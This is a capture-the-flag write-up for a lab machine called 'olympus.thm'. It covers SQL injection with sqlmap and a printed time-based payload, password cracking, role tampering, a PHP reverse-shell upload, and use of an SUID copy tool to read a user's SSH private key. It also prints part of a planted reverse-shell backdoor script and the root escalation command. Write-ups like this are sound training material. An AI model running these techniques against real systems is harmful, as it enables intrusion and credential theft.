## Objectives
- What is Flag 1?
- What is Flag 2?
- What is Flag 3?
- What is Flag 4?

<br>

## Initial Enumeration

### Nmap Scan

`sudo nmap -sV -sC -T4 10.10.83.73`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://olympus.thm
```

Given it's trying to reach olympus.thm I went ahead and added that to my hosts file.

<br>

### Gobuster Scan

`gobuster dir -u http://olympus.thm -t 100 -r -x php,txt,html -w dir-med.txt`

```

## Website Digging

Visiting the main page:

![](images/olympus1.png)

Directory browsing is enabled on **/static** but looking through the files doesn't provide anything interesting.

No cookies or anything saved for this website.

Trying to access **/phpmyadmin** gives us a forbidden as expected, but also provides us the underlying webserver and version:

![](images/olympus2.png)

Looking at **~webmaster** shows us the old version of the site mentioned on the main page:

![](images/olympus3.png)

Scrolling down to the bottom:

![](images/olympus4.png)

None of the links on the top menu bar do anything. Nor do any the buttons, or the links at the bottom after scrolling down.

Testing the search box for **SQLi** shows:

![](images/olympus5.png)

I try to login as root with ' or 1=1 as the password and it doesn't actually do anything.

<br>

## SQLi

Let's see what **sqlmap** finds for us:

`sqlmap -u http://olympus.thm/~webmaster -T users --dump --forms --crawl=2 --batch`

```
sqlmap identified the following injection point(s) with a total of 144 HTTP(s) requests:
---
Parameter: user_name (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user_name=MxlA' AND (SELECT 6854 FROM (SELECT(SLEEP(5)))CfPK) AND 'hbcl'='hbcl&user_password=&login=tDoN
```

In the olympus database it found 9 columns for the users table:

```
[10:16:20] [INFO] fetching columns for table 'users' in database 'olympus'
[10:16:20] [INFO] retrieved: 9

[10:32:22] [INFO] retrieved: user_password
[10:35:32] [INFO] retrieved: user_role
```

And it found 3 users starting with **prometheus**:

```
[10:38:04] [INFO] retrieved: 
[10:38:16] [INFO] retrieved: prometheus@olympus.thm
[10:41:06] [INFO] retrieved: prometheus

```

And **root**:

```

[10:53:07] [INFO] retrieved: root@chat.^X@seolympus.thm
[10:56:01] [INFO] retrieved: root

[11:05:25] [INFO] retrieved: Admin
```

And finally no olympus system is complete with **zeus**:

```
[11:05:57] [INFO] retrieved: dgas
[11:06:22] [INFO] retrieved: zeus@chat.olympus.thm
[11:09:11] [INFO] retrieved: zeus

[11:18:55] [INFO] retrieved: User
```

And the full results:

```
Database: olympus
Table: users
[3 entries]
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |

+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
```

I try and crack the hashes and only the one for **prometheus** cracks:

`hashcat-6.2.5>hashcat -m 3200 -w 3 -O -D 1,2 hash.txt rockyou.txt`

```
$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C:<REDACTED>
Recovered........: 1/3 (33.33%) Digests, 1/3 (33.33%) Salts
```

On the CMS page I capture a search request using the search box and save it to a file and then use that to further enumerate with sqlmap. I should have done this earlier it was so much faster than the previous way I found the users. It looks like there are additional tables inside the olympus database:

`sqlmap -r test.req --tables olympus --batch`

```
Database: olympus
[6 tables]
+------------------------------------------------------+
| categories                                           |
| chats                                                |
| comments                                             |
| flag                                                 |
| posts                                                |
| users                                                |
+------------------------------------------------------+
```

The flag table certainly looks interesting!

`sqlmap -r test.req -D olympus -T flag --batch --dump`

```
Database: olympus
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{<REDACTED>} |
+---------------------------+
```

That answers our what is flag 1 objective.

## More Website Digging

Back on the website I try to login with the **prometheus** user credentails we have and it works, and brings us to the CMS admin page:

![](images/olympus6.png)

Under the users menu on the left there is an option to add a new user, and it let's me add a new user and assign them to admin status, whereas I'm only a normal user on my current user:

![](images/olympus7.png)

![](images/olympus8.png)

![](images/olympus9.png)

With the adminuser added as an admin I logout and then try to log in as that user, but it doesn't actually log me in like it did with the prometheus user for some reason.

I log back in as promethus and it takes me right to the CMS. Odd. Let's try something else here.

I start up **burp suite** and from the profile page of the prometheus user I click update user to capture the request in burp:

![](images/olympus10.png)

I modify the user_role section to Admin to see if it we can just make ourselves an admin that way and then send the request through, and it works:

![](images/olympus11.png)

I try everything I can to further exploit this website now that we're an admin account but nothing works.

Looking back at the users table the root account had an email address of **root@chat.olympus.thm** but we haven't seen a chat portion anywhere. Let's add this to our hosts and see if we can access it.

![](images/olympus12.png)

Ok that's something new. Let's gobuster scan it to see what we can find on **chat.olympus.thm**:

`gobuster dir -u http://chat.olympus.thm/ -t 100 -r -x html,php,txt -w dir-med.txt`

```
/config.php           (Status: 200) [Size: 0]
/static               (Status: 200) [Size: 1761]
/phpmyadmin           (Status: 403) [Size: 281] 
/uploads              (Status: 200) [Size: 0]   
/login.php            (Status: 200) [Size: 1577]
/index.php            (Status: 200) [Size: 1577]
/upload.php           (Status: 200) [Size: 112] 
/javascript           (Status: 403) [Size: 281] 
/home.php             (Status: 200) [Size: 1577]
/logout.php           (Status: 200) [Size: 1577]
```

Nothing much interesting in those results.

I check to see if I can login as prometheus and it works, and then try to upload a php reverse shell which will likely be stored in the /uploads folder, but reading the chat message it says uploads get renamed to random file names.

![](images/olympus13.png)

<br>

## System Access - www-data

Back in the olympus database there was a table called chats. I bet the random file name will be stored in there. I run sqlmap:

`sqlmap -r test.req -D olympus -T chats --batch --dump`

```
Database: olympus
Table: chats
[5 entries]

| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |

+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
```

Sure enough, we have our random file name that's probably hanging out in the /uploads folder. I point my browser towards the prometheus_password.txt file and it just displays the message "you really thought it would be this easy ?!".

I start up a listener on my system and access the reverse shell I added in the chat app:

![](images/olympus14.png)

And we're in! A quick shell upgrade and we're ready to start looking around the system:

![](images/olympus15.png)

<br>

## System Enumeration - www-data

No luck with `sudo -l` it requires a password.

Same thing with `getcap -r / 2>/dev/null` there are no files with interesting capabilities.

Checking users with shell access via `cat /etc/passwd | grep bash`:

```
root:x:0:0:root:/root:/bin/bash
zeus:x:1000:1000:Zeus:/home/zeus:/bin/bash
```

Looking in **/var/www/html** shows us a non-standard directory name zeus owns that we can't access. We'll have to come back to this later I'm betting:

```
drwxrwx--x 2 root     zeus      4096 Jul 15 20:55 0aB44fdS3eDnLkpsz3deGv8TttR4sc
```

Checking out **/home/zeus** shows us a file called **user.flag** which gives us the answer to our second objective "what is flag 2?":

`wc -c /home/zeus/user.flag`

```
34 /home/zeus/user.flag
```

Looking for SUID files with `find / -perm /4000 2>/dev/null` brings up one non-standard SUID file:

```
/usr/bin/cputils
```

And also interesting is it's owned by the zeus user:

```
-rwsr-xr-x 1 zeus zeus 17728 Apr 18 09:27 /usr/bin/cputils
```

When running the program the following appears:

```
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: 
```

Trying to get an idea of what it does by running `strings` on it shows us:

```
Enter the Name of Source File: 
Error Occurred!
Enter the Name of Target File: 
File copied successfully.
```

So it has something to do with copying files. Let's test it out.

```
www-data@olympus:/tmp$ /usr/bin/cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: /home/zeus/.ssh/id_rsa

Enter the Name of Target File: /tmp/id_rsa

File copied successfully.
```

`cat /tmp/id_rsa`

```
-----BEGIN OPENSSH PRIVATE KEY-----

NabdkfRp238WfMAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQChujddUX2i
```

Well, that was easy! Let's get that key created on our own system and ssh over as **zeus**.

Trying to connect over reveals that there is a password associated with the private key:

```
zeus@10.10.204.46's password:
```

Let's see if we can crack it.

`ssh2john id_rsa > hash`

`john hash --wordlist=rockyou.txt`

```

```

Alright, now let's try and ssh back over again.

## System Enumeration - Zeus

`sudo -l` requires a password which we don't have but it looks like he does have access to sudo since there's a **.sudo_as_admin_successful** file in his home directory.

`id`

```
uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
```

That directory we ran across early that we couldn't access because it was owned by zeus should be looked at. I change over to it:

`cd /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc`

Inside we see a .php file that looks interesting:

```
-rwxr-xr-x 1 root     zeus     1589 Jul 15 20:55 VIGQFQFMYOST.php
```

It looks like that hacker Zeus put a backdoor in the system!:

```
<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";
```

The $pass variable is an MD5 hash which I try and crack with **hashcat**:

`hashcat -m 0 -w 3 -O -D 1,2 hash.txt rockyou.txt`

```
a7c5ffcf139742f52a5267c4a0674129:<REDACTED>
Recovered........: 1/1 (100.00%) Digests
```

It however does not work when trying to `sudo -l` again.

Looking at the $suid_bd and shell makes it looks like we can run the $shell command and get root.

## Root

I run the command and sure enough we get root:

`uname -a; w; /lib/defended/libc.so.99`

```
zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ uname -a; w; /lib/defended/libc.so.99
Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

```

Looking in **/root** shows us our 3rd objective, the 3rd flag:

At the bottom they mention a bonus flag and that regex can be useful so I run a recursive grep on the string **flag{** and find it in the following file which gives us the answer to our last objective, flag 4:

`grep -r flag{`

```
etc/ssl/private/.b0nus.fl4g:flag{<REDACTED>}
```

With that we've completed this CTF!

## Conclusion

A quick run down of what we covered in this CTF:

- Basic enumeration with **nmap** and **gobuster**
- Exploting an **SQLi** vulnerability with **sqlmap** to find users and password hashes for the website
- Using **hashcat** to crack the password for one of the website users giving us access to the site
- Further testing the website with **burp suite** and finding we can change our user to admin by capturing a request and modifying it en route
- Finding a chat application that let's us upload files, however files get assigned a random name making it more difficult for us to get a reverse shell
- Uploading a **reverse php shell** and then using **sqlmap** to dump the **chats** table, which reveals the random file named assigned to the file we uploaded, which gives us our initial foothold on the system
- A user on the system owns a non-standard SUID file which allows us to copy their private .ssh key to a directory we're able to view it
- When trying to ssh over as the new user we find the ssh private key is password protected so we crack it with **ssh2john** and **John the Ripper**, then connect over to the system as the user
- The new user installed a backdoor in a directory located inside **/var/www/html** that is a webshell and runs a specific command to escalate to root, which we run and get a root shell
- Lastly we use a recursive grep to find the last piece of hidden information required to complete this challenge
